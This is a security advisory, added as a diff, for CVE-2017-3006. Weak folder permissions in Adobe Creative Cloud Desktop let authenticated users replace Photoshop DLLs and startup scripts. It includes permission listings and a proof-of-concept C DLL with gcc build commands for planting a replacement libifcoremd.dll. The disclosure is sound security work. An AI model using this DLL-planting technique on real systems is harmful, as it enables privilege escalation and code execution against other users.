@@ -1,0 +1,135 @@
+[+] Credits: John Page aka hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ADOBE-CREATIVE-CLOUD-PRIVILEGE-ESCALATION.txt
+[+] ISR: apparitionSec
+
+
+
+Vendor:
+==============
+www.adobe.com
+
+
+
+Product:
+========================================
+Adobe Creative Cloud Desktop Application
+<= v4.0.0.185 
+
+
+
+Vulnerability Type:
+=====================
+Privilege Escalation
+
+
+
+CVE Reference:
+==============
+CVE-2017-3006
+APSB17-13
+
+
+Vulnerability Details:
+=====================
+Adobe CC uses weak insecure permissions settings on the "Adobe Photoshop dll & Startup Scripts" directories. This may allow authenticated users
+to execute arbitrary code in the security context of ANY other users with elevated privileges on the affected system. Issue is the 'C' flag
+(Change) for 'Authenticated Users' group.
+
+
+References:
+============
+https://helpx.adobe.com/security/products/creative-cloud/apsb17-13.html
+
+
+e.g.
+
+C:\Program Files (x86)\Common Files\Adobe\32 bit Photoshop dlls>cacls * | more
+C:\Program Files (x86)\Common Files\Adobe\32 bit Photoshop dlls\libifcoremd.dll BUILTIN\Administrators:(ID)F
+                                                                                NT AUTHORITY\SYSTEM:(ID)F
+                                                                                BUILTIN\Users:(ID)R
+                                                                                NT AUTHORITY\Authenticated Users:(ID)C
+
+C:\Program Files (x86)\Common Files\Adobe\32 bit Photoshop dlls\libmmd.dll BUILTIN\Administrators:(ID)F
+                                                                           NT AUTHORITY\SYSTEM:(ID)F
+                                                                           BUILTIN\Users:(ID)R
+                                                                           NT AUTHORITY\Authenticated Users:(ID)C
+
+
+
+C:\Program Files (x86)\Common Files\Adobe\32 bit Photoshop dlls>ls -lt
+total 2407
+-rwxr-xr-x    1 Test     Administ   895184 Jun  3  2016 libifcoremd.dll
+-rwxr-xr-x    1 Test     Administ  4033464 Jun  3  2016 libmmd.dll
+
+
+///////////  AND /////////////////////
+
+
+C:\Program Files (x86)\Common Files\Adobe\Startup Scripts CC\Adobe Photoshop>cacls * | more
+C:\Program Files (x86)\Common Files\Adobe\Startup Scripts CC\Adobe Photoshop\photoshop BUILTIN\Administrators:(ID)F
+                                                                                       BUILTIN\Administrators:(OI)(CI)(IO)(ID)F
+                                                                                       NT AUTHORITY\SYSTEM:(ID)F
+                                                                                       NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F
+                                                                                       BUILTIN\Users:(OI)(CI)(ID)R
+                                                                                       NT AUTHORITY\Authenticated Users:(ID)C
+                                                                                       NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C
+
+C:\Program Files (x86)\Common Files\Adobe\Startup Scripts CC\Adobe Photoshop\photoshop.jsx BUILTIN\Administrators:(ID)F
+                                                                                           NT AUTHORITY\SYSTEM:(ID)F
+                                                                                           BUILTIN\Users:(ID)R
+                                                                                           NT AUTHORITY\Authenticated Users:(ID)C
+
+
+
+
+Exploit/POC code(s):
+====================
+Compile below DLL 'C' code name it as "libifcoremd.dll"
+Replace existing Adobe CC "libifcoremd.dll" file, wait for it to be referenced.
+
+
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved){
+  switch (reason) {
+  case DLL_PROCESS_ATTACH:
+    MessageBox(NULL, NULL, "PWN!", MB_OK);  
+    break;
+  }
+  return TRUE;
+}
+
+
+gcc -c libifcoremd.c
+gcc -shared -o  libifcoremd.dll libifcoremd.o
+
+
+
+Disclosure Timeline:
+========================================
+Vendor Notification: January 25, 2017
+Vendor updates Adobe CC : April 11, 2017
+April 12, 2017 : Public Disclosure
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Severity Level:
+===============
+Medium
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
